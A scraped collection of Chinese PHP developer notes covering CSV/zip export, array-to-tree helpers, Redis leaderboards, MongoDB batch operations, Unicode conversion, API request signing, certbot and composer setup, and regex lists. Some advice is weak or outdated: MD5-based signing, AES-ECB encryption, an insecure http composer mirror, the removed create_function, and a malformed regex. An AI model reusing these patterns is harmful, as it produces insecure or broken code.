foreach ($index as $item) &#123; $tmpData[] = isset($v[$item]) ? $v[$item] : ''; &#125; self::outPut($tmpData); &#125; $fileArr[] = self::$outPutFile; &#125; $zipFile = $tmpPath . $fileName . date('YmdHi') . '.zip'; $zipRes = self::zipFile($fileArr, $zipFile); return $zipRes; &#125; /** * 向文件写入数据 * @param array $data */ public static function outPut($data = []) &#123; if (is_array($data) &amp;&amp; !empty($data)) &#123; $data = implode(',', $data); file_put_contents(self::$outPutFile, iconv("UTF-8", "GB2312//IGNORE", $data) . PHP_EOL, FILE_APPEND); &#125; &#125; /** * 压缩文件 * @param $sourceFile * @param $distFile * @return mixed */ public static function zipFile($sourceFile, $distFile) &#123; $zip = new \ZipArchive(); if ($zip-&gt;open($distFile, \ZipArchive::CREATE) !== true) &#123; return $sourceFile; &#125; $zip-&gt;open($distFile, \ZipArchive::CREATE); foreach ($sourceFile as $file) &#123; $fileContent = file_get_contents($file); $file = iconv('utf-8', 'GBK', basename($file)); $zip-&gt;addFromString($file, $fileContent); &#125; $zip-&gt;close(); return $distFile; &#125; /** * 下载文件 * @param $filePath * @param $fileName */ public static function download($filePath, $fileName) &#123; if (!file_exists($filePath . $fileName)) &#123; header('HTTP/1.1 404 NOT FOUND'); &#125; else &#123; //以只读和二进制模式打开文件 $file = fopen($filePath . $fileName, "rb"); //告诉浏览器这是一个文件流格式的文件 Header("Content-type: application/octet-stream"); //请求范围的度量单位 Header("Accept-Ranges: bytes"); //Content-Length是指定包含于请求或响应中数据的字节长度 Header("Accept-Length: " . filesize($filePath . $fileName)); //用来告诉浏览器，文件是可以当做附件被下载，下载后的文件名称为$file_name该变量的值 Header("Content-Disposition: attachment; filename=" . $fileName); //读取文件内容并直接输出到浏览器 echo fread($file, filesize($filePath . $fileName)); fclose($file); exit(); &#125; &#125;&#125; https://learnku.com/articles/34512 24 小时排行榜实时更新12345678ZADD KEY_NAME SCORE1 VALUE1.. SCOREN VALUEN利用 ZADD 按小时划分添加用户的积分信息，然后用 ZUNIONSTORE 并集实现 24 小时的游戏积分总和，实现 “24 小时排行榜”Redis 在遇到分数相同时是按照集合成员自身的字典顺序来排序，这里即是按照”user2″和”user3″这两个字符串进行排序，以逆序排序的话 user3 自然排到了前面。要解决这个问题，我们可以考虑在分数中加入时间戳，计算公式为：带时间戳的分数 = 实际分数*10000000000 + (9999999999 – timestamp) ZUNIONSTORE destination numkeys key [key ...] Redis Zunionstore 命令计算给定的一个或多个有序集的并集，其中给定 key 的数量必须以 numkeys 参数指定，并 将该并集(结果集)储存到 destination 。 默认情况下，结果集中某个成员的分数值是所有给定集下该成员分数值之和 。https://learnku.com/articles/30279 数组操作123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253/** * 数组层级缩进转换 * @param array $array 源数组 * @param int $pid * @param int $level * @return array */function Array2level($array, $pid = 0, $level = 1)&#123; static $list = []; foreach ($array as $v) &#123; if ($v['pid'] == $pid) &#123; $v['level'] = $level; $list[] = $v; Array2level($array, $v['id'], $level + 1); &#125; &#125; return $list;&#125;/** * 把返回的数据集转换成Tree * @access public * @param array $list 要转换的数据集 * @param string $pid parent标记字段 * @param string $level level标记字段 * @return array */function list_to_tree($list, $pk='id', $pid = 'pid', $child = 'son', $root = 0, $is_count = false) &#123; // 创建Tree $tree = []; if(is_array($list)) &#123; // 创建基于主键的数组引用 $refer = []; foreach ($list as $key =&gt; $data) &#123; $refer[$data[$pk]] =&amp; $list[$key]; &#125; foreach ($list as $key =&gt; $data) &#123; // 判断是否存在parent $parentId = $data[$pid]; if ($root == $parentId) &#123; $tree[] =&amp; $list[$key]; &#125;else&#123; if (isset($refer[$parentId])) &#123; $parent =&amp; $refer[$parentId]; $parent[$child][] =&amp; $list[$key]; if($is_count==true) $parent['_count'] = count($parent[$child]); &#125; &#125; &#125; &#125; return $tree;&#125;/** * 将数据格式化成树形结构 * @param array $items * @return array */function genTree($items,$pk='id',$pid = 'pid', $child = '_child') &#123; $tree = []; //格式化好的树 foreach ($items as $item) if (isset($items[$item[$pid]])) $items[$item[$pid]][$child][] = &amp;$items[$item[$pk]]; else $tree[] = &amp;$items[$item[$pk]]; return $tree;&#125;/** * 多个数组的笛卡尔积 * * @param unknown_type $data */function combineDika() &#123; $data = func_get_args(); $data = current($data); $cnt = count($data); $result = array(); $arr1 = array_shift($data); foreach($arr1 as $key=&gt;$item) &#123; $result[] = array($item); &#125; foreach($data as $key=&gt;$item) &#123; $result = combineArray($result,$item); &#125; return $result;&#125;/** * 两个数组的笛卡尔积 * @param array $arr1 [description] * @param array $arr2 [description] * @return [type] [description] * @date 2017-08-07 * @author 赵俊峰 &lt;981248356@qq.com&gt; */function combineArray($arr1 =[],$arr2=[]) &#123; $result = []; foreach ($arr1 as $item1) &#123; foreach ($arr2 as $item2) &#123; $temp = $item1; $temp[] = $item2; $result[] = $temp; &#125; &#125; return $result;&#125;/** * 将二维数组以元素的某个值作为键 并归类数组 * array( array('name'=&gt;'aa','type'=&gt;'pay'), array('name'=&gt;'cc','type'=&gt;'pay') ) * array('pay'=&gt;array( array('name'=&gt;'aa','type'=&gt;'pay') , array('name'=&gt;'cc','type'=&gt;'pay') )) * @param $arr 数组 * @param $key 分组值的key * @return array */function group_same_key($arr,$key)&#123; $new_arr = array(); foreach($arr as $k=&gt;$v )&#123; $new_arr[$v[$key]][] = $v; &#125; return $new_arr;&#125;/** * @param $arr * @param $key_name * @return array * 将数据库中查出的列表以指定的 id 作为数组的键名 */function convert_arr_key($arr, $key_name='id')&#123; $arr2 = []; foreach($arr as $key =&gt; $val)&#123; $arr2[$val[$key_name]] = $val; &#125; return $arr2;&#125;/** * 数组 转 对象 * * @param array $arr 数组 * @return object */function array_to_object($arr) &#123; if (gettype($arr) != 'array') &#123; return; &#125; foreach ($arr as $k =&gt; $v) &#123; if (gettype($v) == 'array' || getType($v) == 'object') &#123; $arr[$k] = (object)array_to_object($v); &#125; &#125; return (object)$arr;&#125;/** * 对象 转 数组 * @param object $obj 对象 * @return array */function object_to_array($obj) &#123; $obj = (array)$obj; foreach ($obj as $k =&gt; $v) &#123; if (gettype($v) == 'resource') &#123; return; &#125; if (gettype($v) == 'object' || gettype($v) == 'array') &#123; $obj[$k] = (array)object_to_array($v); &#125; &#125; return $obj;&#125;//将 xml数据转换为数组格式。function xml_to_array($xml)&#123; $reg = "/&lt;(\w+)[^&gt;]*&gt;([\\x00-\\xFF]*)&lt;\\/\\1&gt;/"; if(preg_match_all($reg, $xml, $matches))&#123; $count = count($matches[0]); for($i = 0; $i &lt; $count; $i++)&#123; $subxml= $matches[2][$i]; $key = $matches[1][$i]; if(preg_match( $reg, $subxml ))&#123; $arr[$key] = xml_to_array( $subxml ); &#125;else&#123; $arr[$key] = $subxml; &#125; &#125; &#125; return $arr;&#125; /** * array_delete 删除数组中的某个值 * @param $array * @param $value * @return mixed */function array_delete($array, $value)&#123; $key = array_search($value, $array); if ($key !== false) array_splice($array, $key, 1); return $array;&#125;// 分析枚举类型配置值 格式 a:名称1,b:名称2function parse_config_attr($value, $type = null) &#123; switch ($type) &#123; default: //解析"1:1\r\n2:3"格式字符串为数组 $array = preg_split('/[,;\r\n]+/', trim($value, ",;\r\n")); if (strpos($value,':')) &#123; $value = array(); foreach ($array as $val) &#123; list($k, $v) = explode(':', $val); $value[$k] = $v; &#125; &#125; else &#123; $value = $array; &#125; break; &#125; return $value;&#125;//array_column()函数兼容低版本PHPif (!function_exists('array_column')) &#123; function array_column($input, $columnKey, $indexKey = null) &#123; $columnKeyIsNumber = (is_numeric($columnKey)) ? true : false; $indexKeyIsNull = (is_null($indexKey)) ? true : false; $indexKeyIsNumber = (is_numeric($indexKey)) ? true : false; $result = array(); foreach ((array) $input as $key =&gt; $row) &#123; if ($columnKeyIsNumber) &#123; $tmp = array_slice($row, $columnKey, 1); $tmp = (is_array($tmp) &amp;&amp; !empty($tmp)) ? current($tmp) : null; &#125; else &#123; $tmp = isset($row[$columnKey]) ? $row[$columnKey] : null; &#125; if (!$indexKeyIsNull) &#123; if ($indexKeyIsNumber) &#123; $key = array_slice($row, $indexKey, 1); $key = (is_array($key) &amp;&amp; !empty($key)) ? current($key) : null; $key = is_null($key) ? 0 : $key; &#125; else &#123; $key = isset($row[$indexKey]) ? $row[$indexKey] : 0; &#125; &#125; $result[$key] = $tmp; &#125; return $result; &#125;&#125;http://www.jackhhy.cn/article/29/5.html PHP-fpm MongoDB 连接数1234567891011121314php7 的 MongoDB 扩展中，php 客户端是长连接（及时请求结束，只要 php-fpm 进程没有杀掉，连接就一直保持，目的是下次请求时减少连接带来的性能消耗），并且没有关闭连接的函数。 https://learnku.com/laravel/t/34780 解决办法而我们 php-fpm 配置中，pm.min_spare_servers = 100，pm.max_spare_servers = 200，空闲进程是至少开了 100, 所以大量空闲连接占用了 MongoDB 连接。然后我们根据实际情况，配置改为 pm.min_spare_servers = 5，pm.max_spare_servers = 10。重新部署后解决问题。连接数降了下了，没有超过 100.总结在 PHP7 中，MongoDB 是长连接，一个请求完，对应得 php-fpm 进程没有被 kill 掉化，这个连接不会断开，会一直保持。所以要减少连接个数，需要合理设置 php-fpm 空闲进程数php7 之后 采用 mongodb 扩展 这个扩展内置的 API 没有关闭连接的方法 所以只能通过 fpm 进程来控制了 实际连接数是由 pm.max_children 控制的 有多少 fpm 进程就会有多少连接 pm.min_spare_servers &amp; pm.min_spare_servers 控制空闲进程数 减少连接占用如果是高负载服务器 pm.max_children &amp; pm.min_spare_servers &amp; pm.min_spare_servers 这几项值又不会设置太低 而持久连接对于高并发来说可以减少 IO 开销 但是 mongodb 连接池是由 fpm 进程维护 这样持久连接数会很高 不知道以后会不会专门为 mongodb 开辟进程连接池 优化这块的功能 批量更新1234567891011121314151617181920212223242526272829303132333435363738394041424344$materials = $app-&gt;material-&gt;list($type, 0); // 获取素材列表$page = $materials['total_count'] / 20;for ($x = 0; $x &lt;= $page; $x++) &#123; $offset = $x * 20; $materials = $app-&gt;material-&gt;list($type, $offset); collect($materials['item'])-&gt;map(function ($v) use ($platformId, $type, $user) &#123; WeChatMaterial::query() -&gt;updateOrCreate([ 'platform_id' =&gt; $platformId, 'media_id' =&gt; $v['media_id'], ], [ 'type' =&gt; $type, 'user_id' =&gt; $user-&gt;id, 'name' =&gt; $v['name'], 'update_time' =&gt; $v['update_time'], 'url' =&gt; $v['url'], ]); &#125;);&#125;$startId = 0;$limit = 20;while (true) &#123; $materials = $app-&gt;material-&gt;list($type, $startId); // 获取素材列表 if (empty($materials) || empty($materials['item'])) &#123; break; &#125; foreach ($materials['item'] as $k =&gt; $v) &#123; WeChatMaterial::query() -&gt;updateOrCreate([ 'platform_id' =&gt; $platformId, 'media_id' =&gt; $v['media_id'], ], [ 'type' =&gt; $type, 'user_id' =&gt; $user-&gt;id, 'name' =&gt; $v['name'], 'update_time' =&gt; $v['update_time'], 'url' =&gt; $v['url'], ]); &#125; $startId = $startId + $limit; usleep(200);&#125;https://learnku.com/laravel/t/34751 php7 mongodb 分批删除123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124$limit = 1000; $skip = 0; $i = 1; $log = new \App\Models\Log; while (true) &#123; $list = $log-&gt;query([], ['skip' =&gt; $skip, 'limit' =&gt; $limit, 'projection' =&gt; ['_id' =&gt; 1],'sort' =&gt; ['_id' =&gt; 1]]); if (!$list) &#123; break; &#125; dump('第'.$i.'次'); if ($i &gt; 2000) &#123; break; &#125; $ids = array_column($list, '_id'); $messageIds = array_map(function ($value)&#123; return new \MongoDB\BSON\ObjectID($value); &#125;, $ids); try &#123; $c=$log-&gt;delete(['_id' =&gt; ['$in' =&gt; $messageIds]]);dump($c); &#125; catch (\Exception $e) &#123; \Log::error('delete message fail', ['ids' =&gt; $ids, 'msg' =&gt; $e-&gt;getMessage()]); &#125; $skip += $limit; $i++; &#125;public function __construct(array $attributes=[]) &#123; parent::__construct($attributes); if(version_compare(PHP_VERSION,'7.0','&gt;='))&#123; $dsn=$this-&gt;getDNS(); $this-&gt;manager=new \MongoDB\Driver\Manager($dsn); $this-&gt;writeConcern = new \MongoDB\Driver\WriteConcern(1, 100); &#125; else &#123; \DB::connection('mongodb')-&gt;enableQueryLog(); &#125; &#125; private function getDNS()&#123; $name=$this-&gt;connection; $connections=app()-&gt;config['database.connections']; if (is_null($config = array_get($connections, $name))) &#123; throw new \Exception("Database [$name] not configured."); &#125; $this-&gt;namespace=$config['database'].'.'.$this-&gt;collection; if ($config['username'] &amp;&amp; $config['password']) &#123; return 'mongodb://'.$config['username'].":".rawurlencode($config['password']).'@'.$config['host'].':'.$config['port']."/".$config['database'].(isset($config['options']['replicaSet'])?'?replicaSet='.$config['options']['replicaSet']:''); &#125; else &#123; return 'mongodb://'.$config['host'].':'.$config['port']."/".$config['database'].(isset($config['options']['replicaSet'])?'?replicaSet='.$config['options']['replicaSet']:''); &#125; &#125; public function create(array $attributes)&#123; if(count($attributes)&lt;1)&#123; return ''; &#125; $_id=new \MongoDB\BSON\ObjectID(); $attributes=array_merge($attributes,['_id'=&gt;$_id]); $bulk=new \MongoDB\Driver\BulkWrite(['ordered' =&gt; true]); $bulk-&gt;insert($attributes); try&#123; $result = $this-&gt;manager-&gt;executeBulkWrite($this-&gt;namespace, $bulk, $this-&gt;writeConcern); &#125;catch(\Exception $e)&#123; return false; &#125; return (string)$_id; &#125; public function insert(array $attributes)&#123; if(count($attributes)&lt;1)&#123; return ''; &#125; $bulk=new \MongoDB\Driver\BulkWrite(['ordered' =&gt; true]); foreach($attributes as $at)&#123; $bulk-&gt;insert($at); &#125; try&#123; $result = $this-&gt;manager-&gt;executeBulkWrite($this-&gt;namespace, $bulk, $this-&gt;writeConcern); &#125;catch(\Exception $e)&#123; return false; &#125; return $result-&gt;getInsertedCount(); &#125; public function update($where = [], $update = [], $upsert = false) &#123; $bulk = new \MongoDB\Driver\BulkWrite(['ordered' =&gt; true]); $bulk-&gt;update($where, ['$set' =&gt; $update], ['multi' =&gt; true, 'upsert' =&gt; $upsert]); $result = $this-&gt;manager-&gt;executeBulkWrite($this-&gt;namespace, $bulk, $this-&gt;writeConcern); return $result-&gt;getModifiedCount(); &#125; public function delete($where = [], $limit = 0) &#123; $bulk = new \MongoDB\Driver\BulkWrite(['ordered' =&gt; true]); $bulk-&gt;delete($where, ['limit' =&gt; $limit]);//limit 为 0 时，删除所有匹配数据 $result = $this-&gt;manager-&gt;executeBulkWrite($this-&gt;namespace, $bulk, $this-&gt;writeConcern); return $result-&gt;getDeletedCount(); &#125; public function count($where = []) &#123; $command = new \MongoDB\Driver\Command(['count' =&gt; $this-&gt;collection, 'query' =&gt; $where]); $result = $this-&gt;manager-&gt;executeCommand(explode('.', $this-&gt;namespace)[0], $command); $res = $result-&gt;toArray(); $count = 0; if ($res) &#123; $count = $res[0]-&gt;n; &#125; return $count; &#125; public function query($where = [], $option = []) &#123; $query = new \MongoDB\Driver\Query($where, $option);//http://php.net/manual/zh/mongodb-driver-manager.executequery.php $result = $this-&gt;manager-&gt;executeQuery($this-&gt;namespace, $query); $res = []; foreach ($result as $value)&#123; $v = (array)$value; $v['_id'] = (string)$v['_id']; $res[] = $v; &#125; return $res; &#125; 头部插入内容12345如果是图片开头，在图片后面插入文字，如果不是图片开头，直接插入文字到头部preg_match('#^(&lt;img class="img" src=.*"/&gt;)*(.*)#',$data, $m); if ($m &amp;&amp; isset($m[1]) &amp;&amp; isset($m[2])) &#123; $data = $m[1].$ad.$m[2]; &#125; 生成按时间增长的全局唯一主键123456789101112131415161718192021222324252627282930313233343536373839404142434445function getGenerateId ($len = 12) &#123; $temp = random_bytes($len); return bin2hex($temp);&#125;使用 mongo 扩展 new \MongoDB\BSON\ObjectID ()function generate_id_hex()&#123; static $i = 0; $i OR $i = mt_rand(1, 0x7FFFFF); return sprintf("%08x%06x%04x%06x", /* 4-byte value representing the seconds since the Unix epoch. */ time() &amp; 0xFFFFFFFF, /* 3-byte machine identifier. * * On windows, the max length is 256. Linux doesn't have a limit, but it * will fill in the first 256 chars of hostname even if the actual * hostname is longer. * * From the GNU manual: * gethostname stores the beginning of the host name in name even if the * host name won't entirely fit. For some purposes, a truncated host name * is good enough. If it is, you can ignore the error code. * * crc32 will be better than Times33. */ crc32(substr((string)gethostname(), 0, 256)) &gt;&gt; 8 &amp; 0xFFFFFF, /* 2-byte process id. */ getmypid() &amp; 0xFFFF, /* 3-byte counter, starting with a random value. */ $i = $i &gt; 0xFFFFFE ? 1 : $i + 1 );&#125;for ($j=0; $j &lt;100 ; $j++) &#123; echo generate_id_hex(); echo "&lt;br&gt;"; # code...&#125;https://learnku.com/articles/34849 array_search 和 in_array 函数效率问题123456789采用 array_flip 翻转后，用 isset 代替 in_array 函数，用 $array[key] 替代 array_search, 这样能解决大数组超时耗时问题$needle = 'test for this';$flipped_haystack = array_flip($haystack);if ( isset($flipped_haystack[$needle]) )&#123; print "Yes it's there!";&#125; 把array或json以array字符串的形式输出123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384class Utils&#123; /** * 把array或json以array字符串的形式输出 等同于var_export * @param $str * @return string */ public static function outPutArray($str): string &#123; if (is_string($str)) &#123; $arr = json_decode($str, true); if (is_null($arr)) &#123; $ret_str = ''; if (is_numeric($str)) &#123; $ret_str .= '[' .PHP_EOL. $str .PHP_EOL. ']'; &#125; else &#123; $ret_str .= '[' .PHP_EOL. '\''.$str .'\''.PHP_EOL. ']'; &#125; return $ret_str; &#125; &#125; else &#123; $arr = $str; &#125; $str = '[' . PHP_EOL; foreach ($arr as $key =&gt; $value) &#123; if (!is_numeric($key)) &#123; $str .= "'&#123;$key&#125;' =&gt; "; &#125; if (is_array($value)) &#123; $str .= self::outPutArray($value); &#125; else &#123; if (is_string($value)) &#123; $str .= "'&#123;$value&#125;'," . PHP_EOL; &#125; else &#123; $str .= "&#123;$value&#125;," . PHP_EOL; &#125; &#125; &#125; $str .= '],' . PHP_EOL; return $str; &#125;&#125;echo Utils::outPutArray('shiwenyuan');/* * [ * 'shiwenyuan' * ] * */echo Utils::outPutArray(['name'=&gt;'zhangsan', 'age'=&gt;18, 'friend'=&gt;[['name'=&gt;'lisi', 'age'=&gt;19], ['name'=&gt;'wangwu', 'age'=&gt;20]]]);/** * [ *'name' =&gt; 'zhangsan', * 'age' =&gt; 18, * 'friend' =&gt; [ * [ * 'name' =&gt; 'lisi', * 'age' =&gt; 19, * ], * [ * 'name' =&gt; 'wangwu', * 'age' =&gt; 20, * ], * ], * ] */echo Utils::outPutArray('&#123;"name":"zhangsan","age":18,"friend":[&#123;"name":"lisi","age":19&#125;,&#123;"name":"wangwu","age":21&#125;]&#125;');/** * [ *'name' =&gt; 'zhangsan', * 'age' =&gt; 18, * 'friend' =&gt; [ * [ * 'name' =&gt; 'lisi', * 'age' =&gt; 19, * ], * [ * 'name' =&gt; 'wangwu', * 'age' =&gt; 20, * ], * ], * ] */https://shiwenyuan.github.io/post/ck1irc5wh000fq2fyv61xflc6.html unicode 转中文12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576function UnicodeEncode($str)&#123; //split word preg_match_all('/./u',$str,$matches); $unicodeStr = ""; foreach($matches[0] as $m)&#123; //拼接 $unicodeStr .= "&amp;#".base_convert(bin2hex(iconv('UTF-8',"UCS-4",$m)),16,10); &#125; return $unicodeStr;&#125; $str = "新浪微博";echo UnicodeEncode($str)function unicodeDecode($unicode_str)&#123; $json = '&#123;"str":"'.$unicode_str.'"&#125;'; $arr = json_decode($json,true); if(empty($arr)) return ''; return $arr['str'];&#125; $unicode_str = "\u65b0\u6d6a\u5fae\u535a";echo unicodeDecode($unicode_str);js:function convert2Unicode(str) &#123; return str.replace(/[\u0080-\uffff]/g, function($0) &#123; var tmp = $0.charCodeAt(0).toString(16); return "\u" + new Array(5 - tmp.length).join('0') + tmp; &#125;);function unicode2utf8($str)&#123; if(!$str) return $str; $decode = json_decode($str); if($decode) return $decode; $str = '["' . $str . '"]'; $decode = json_decode($str); if(count($decode) == 1)&#123; return $decode[0]; &#125; return $str; function decodeUnicode($str)&#123; return preg_replace_callback('/\\\\u([0-9a-f]&#123;4&#125;)/i', create_function('$matches', 'return iconv("UCS-2BE","UTF-8",pack("H*", $matches[1]));'), $str);$unicodeChar = "\u56de\u590d\uff1a";echo json_decode('"'.$unicodeChar.'"'); https://segmentfault.com/a/1190000003020776 /** * utf8字符转换成Unicode字符 * @param [type] $utf8_str Utf-8字符 * @return [type] Unicode字符 */ function utf8_str_to_unicode($utf8_str) &#123; $unicode = 0; $unicode = (ord($utf8_str[0]) &amp; 0x1F) &lt;&lt; 12; $unicode |= (ord($utf8_str[1]) &amp; 0x3F) &lt;&lt; 6; $unicode |= (ord($utf8_str[2]) &amp; 0x3F); return dechex($unicode); &#125; /** * Unicode字符转换成utf8字符 * @param [type] $unicode_str Unicode字符 * @return [type] Utf-8字符 */ function unicode_to_utf8($unicode_str) &#123; $utf8_str = ''; $code = intval(hexdec($unicode_str)); //这里注意转换出来的code一定得是整形，这样才会正确的按位操作 $ord_1 = decbin(0xe0 | ($code &gt;&gt; 12)); $ord_2 = decbin(0x80 | (($code &gt;&gt; 6) &amp; 0x3f)); $ord_3 = decbin(0x80 | ($code &amp; 0x3f)); $utf8_str = chr(bindec($ord_1)) . chr(bindec($ord_2)) . chr(bindec($ord_3)); return $utf8_str; &#125; 开放API接口签名验证12345678910111213141516171819202122232425262728293031323334353637383940414243AccessKey&amp;SecretKey （开放平台）请求身份为开发者分配AccessKey（开发者标识，确保唯一）和SecretKey（用于接口加密，确保不易被穷举，生成算法不易被猜测）。防止篡改参数签名按照请求参数名的字母升序排列非空请求参数（包含AccessKey），使用URL键值对的格式（即key1=value1&amp;key2=value2…）拼接成字符串stringA；在stringA最后拼接上Secretkey得到字符串stringSignTemp；对stringSignTemp进行MD5运算，并将得到的字符串所有字符转换为大写，得到sign值。请求携带参数AccessKey和Sign，只有拥有合法的身份AccessKey和正确的签名Sign才能放行。这样就解决了身份验证和参数篡改问题，即使请求参数被劫持，由于获取不到SecretKey（仅作本地加密使用，不参与网络传输），无法伪造合法的请求。重放攻击虽然解决了请求参数被篡改的隐患，但是还存在着重复使用请求参数伪造二次请求的隐患。timestamp+nonce方案nonce指唯一的随机字符串，用来标识每个被签名的请求。通过为每个请求提供一个唯一的标识符，服务器能够防止请求被多次使用（记录所有用过的nonce以阻止它们被二次使用）。然而，对服务器来说永久存储所有接收到的nonce的代价是非常大的。可以使用timestamp来优化nonce的存储。假设允许客户端和服务端最多能存在15分钟的时间差，同时追踪记录在服务端的nonce集合。当有新的请求进入时，首先检查携带的timestamp是否在15分钟内，如超出时间范围，则拒绝，然后查询携带的nonce，如存在已有集合，则拒绝。否则，记录该nonce，并删除集合内时间戳大于15分钟的nonce（可以使用redis的expire，新增nonce的同时设置它的超时失效时间为15分钟）。实现请求接口：http://api.test.com/test?name=hello&amp;home=world&amp;work=java客户端生成当前时间戳timestamp=now和唯一随机字符串nonce=random按照请求参数名的字母升序排列非空请求参数（包含AccessKey) stringA="AccessKey=access&amp;home=world&amp;name=hello&amp;work=java&amp;timestamp=now&amp;nonce=random";拼接密钥SecretKey stringSignTemp="AccessKey=access&amp;home=world&amp;name=hello&amp;work=java&amp;timestamp=now&amp;nonce=random&amp;SecretKey=secret";MD5并转换为大写 sign=MD5(stringSignTemp).toUpperCase();最终请求 http://api.test.com/test?name=hello&amp;home=world&amp;work=java&amp;timestamp=now&amp;nonce=nonce&amp;sign=sign; https://blog.csdn.net/qq_18495465/article/details/79248608 PhpSpreadsheet 小教程1234567891011121314151617181920212223242526272829303132333435363738394041&gt; composer require phpoffice/phpspreadsheet&lt;?phprequire 'vendor/autoload.php';use PhpOffice\PhpSpreadsheet\Spreadsheet;use PhpOffice\PhpSpreadsheet\Writer\Xlsx;$spreadsheet = new Spreadsheet();$sheet = $spreadsheet-&gt;getActiveSheet();$sheet-&gt;setCellValue('A1', 'Hello World !');$writer = new Xlsx($spreadsheet);$writer-&gt;save('hello world.xlsx');实例包中带了实例代码，位置 vendor/phpoffice/phpspreadsheet/samples 下&gt; php -S localhost:8000 -t vendor/phpoffice/phpspreadsheet/samples$inputFileType = 'Xls';$inputFileName = './sampleData/example1.xls';$reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader($inputFileType);/** 只要数据 **/$reader-&gt;setReadDataOnly(true);$spreadsheet = $reader-&gt;load($inputFileName);$spreadsheet = PhpOffice\PhpSpreadsheet\IOFactory::load("new.xls");$data = $spreadsheet -&gt;getSheet(0) // 指定第一个工作表为当前 -&gt;toArray(); // 转为数组// 或者得到全部工作表的数据数组 $cells=array();// 工作表对象有迭代器实现foreach ( $spreadsheet-&gt;getWorksheetIterator() as $data ) &#123; $cells = $data-&gt;toArray();&#125;https://learnku.com/articles/30048 进制转换12345$res=bin2hex(openssl_encrypt('test','AES-128-ECB',$key,OPENSSL_RAW_DATA));通过以上函数把 test 转换成 16 进制openssl_decrypt(pack('H*',$res),'AES-128-ECB',$key,OPENSSL_RAW_DATA);再用以上函数把 16 进制转换回来成 test https证书12345wget https://dl.eff.org/certbot-autochmod a+x certbot-auto假设你的域名 mengdodo.com，想获取根域名 https 证书./certbot-auto certonly -d mengdodo.com -d *.mengdodo.com --manual --preferred-challenges dns-01 --server https://acme-v02.api.letsencrypt.org/directory然后按照提示完成两个 txt 解析即可 https，使用 acme.sh 可以申请免费了，我好几项目用了。 composer1234Composer 国内镜像及多线程下载利器 hirak/prestissimo composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/composer global require hirak/prestissimocomposer clearcache Composer 提示 zlib_decode (): data error1234567$ composer config repo.packagist composer http://packagist.phpcomposer.comcomposer config -g --unset repos.packagistcomposer config --unset repos.packagistcomposer clearcachecomposer diagnosecomposer install -vvvhttps://learnku.com/articles/35106 swoole 进程退出12345678910111213141516171819202122232425262728293031323334swoole_process::signal(SIGALRM,function ()&#123; echo "1\n";&#125;);swoole_process::alarm(100*1000);swoole_timer_tick(2000, function ($timer_id) &#123; echo "执行 $timer_id" . PHP_EOL;&#125;);root@687d4c789947:/var/www/swoole2# php timer.php执行 1执行 1执行 1use Swoole\Process;//引入类的命名空间【对应根目录】//安装信号处理器 SIGALRM定时信号 【可以由定时器产生，或是进程发出如pcntl_kill【c是kill】】或是在终端输入kill -s 信号编号或-n 信号值 进程标识符号【进程标识符号可以在代码中通过posix_getpid或是在/proc/PID/目录下查看进程详细数据】 Process::signal(SIGALRM, function () &#123; static $i = 0; echo "#&#123;$i&#125;\talarm\n"; $i++; if ($i &gt; 20) &#123; Process::alarm(-1);//定时器清0操作 &#125;&#125;);//100msProcess::alarm(100 * 1000); //定时器，swoole已经做了封装，默认会阻塞进程【当时间到的时候，系统会唤醒该进程，并发出中断请求,中断处理函数将会收到定时中断，并运行中断处理函数，运行到20后，自动清0，同时进程阻塞。 阻塞：是指操作系统把当前进程释放cpu使用权，此时cpu干其它事情了，产生阻塞的场景如等待网络IO,读写请求等操作 非阻塞：执行请求后，立马返回 swoole 版本多少，4.4+ signal 监听不会加入事件循环了，也就是程序会自动退出。。。https://learnku.com/laravel/t/35076 常用正则表达式1234567891011121314151617181920数字：^[0-9]*$n位的数字：^\d&#123;n&#125;$至少n位的数字：^\d&#123;n,&#125;$m-n位的数字：^\d&#123;m,n&#125;$零和非零开头的数字：^(0|[1-9][0-9]*)$非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(.[0-9]&#123;1,2&#125;)?$带1-2位小数的正数或负数：^(\-)?\d+(\.\d&#123;1,2&#125;)?$正数、负数、和小数：^(\-|\+)?\d+(\.\d+)?$有两位小数的正实数：^[0-9]+(.[0-9]&#123;2&#125;)?$有1~3位小数的正实数：^[0-9]+(.[0-9]&#123;1,3&#125;)?$非零的正整数：^[1-9]\d*$ 或 ^([1-9][0-9]*)&#123;1,3&#125;$ 或 ^\+?[1-9][0-9]*$非零的负整数：^\-[1-9][]0-9"*$ 或 ^-[1-9]\d*$非负整数：^\d+$ 或 ^[1-9]\d*|0$非正整数：^-[1-9]\d*|0$ 或 ^((-\d+)|(0+))$非负浮点数：^\d+(\.\d+)?$ 或 ^[1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0$非正浮点数：^((-\d+(\.\d+)?)|(0+(\.0+)?))$ 或 ^(-([1-9]\d*\.\d*|0\.\d*[1-9]\d*))|0?\.0+|0$正浮点数：^[1-9]\d*\.\d*|0\.\d*[1-9]\d*$ 或 ^(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*))$负浮点数：^-([1-9]\d*\.\d*|0\.\d*[1-9]\d*)$ 或 ^(-(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*)))$浮点数：^(-?\d+)(\.\d+)?$ 或 ^-?([1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0)$http://yyeer.com/%E7%BC%96%E7%A8%8B/2019/06/30/%E6%94%B6%E9%9B%86-%E5%B8%B8%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/ 